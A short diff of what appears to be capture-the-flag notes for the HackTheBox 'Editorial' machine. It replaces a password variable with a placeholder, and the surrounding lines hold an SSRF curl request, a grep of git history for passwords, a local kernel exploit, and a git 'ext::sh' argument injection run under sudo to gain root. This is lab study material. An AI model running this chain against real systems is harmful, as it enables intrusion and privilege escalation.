@@ -773,7 +773,7 @@ gcc -o a 44298.c && ./a   # from /dev/shm
 ```bash
 curl -s -X POST http://editorial.htb/upload-cover -F bookurl=http://127.0.0.1:5000/api/latest/metadata/messages/authors -F bookfile=@/etc/hostname
 git log -p | grep -i password
-echo "$PASS" | sudo -S /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c /tmp/p.sh'
+echo "<PASS>" | sudo -S /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c /tmp/p.sh'
 ```
 
 **Notes:** [SSRF](/notes/web-applications/web-attacks/ssrf/) · [Programs, jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · Writeup: [source](https://foobarto.me/htb/machines/editorial/)
